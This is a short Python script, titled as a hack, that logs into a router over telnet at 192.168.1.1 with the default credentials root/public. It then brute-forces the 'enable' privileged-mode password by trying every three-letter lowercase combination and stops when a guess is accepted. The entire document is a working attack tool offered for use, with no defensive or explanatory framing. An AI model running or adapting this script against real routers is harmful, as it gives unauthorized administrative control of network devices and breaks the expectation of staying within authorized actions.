#!/usr/bin/env python
# Hacking Enable Mode Password
# Jalal Sela (Ligeti)

import telnetlib
import time
from sys import stdout
import itertools
import string

password = []
connection = telnetlib.Telnet()
print 'Connecting to router'
connection.open('192.168.1.1')
print 'Connecting to CLI'
chk = connection.read_until('Username:')
connection.write('root\n')
chk = connection.read_until('Password:')
connection.write('public\n')
chk = connection.read_until('CLI>')
print 'Generating wordlist'
wordlist = itertools.product(string.lowercase, repeat=3)

s_time = time.ctime(time.time())
print 'Started: ' + s_time

for word in wordlist:
    password.append(''.join(word))

print 'Attacking...'
index = 16990
    
while (index < len(password)):
    connection.write('enable\n')
    chk = connection.read_until('Password:')
    for i in range(0, 3):
        print 'Test %d: %s'%(index, password[index])
        stdout.flush()
        connection.write(password[index] + '\n')
        chk = connection.read_until('Password:', 1)
        
        if ('Bad' not in chk):
            print '\n---------------------\nHacked: ' + password[index]
            print 'Started: ' + s_time
            f_time = time.ctime(time.time())
            print 'Finished: ' + f_time 
            print '---------------------'
            exit()
        index += 1
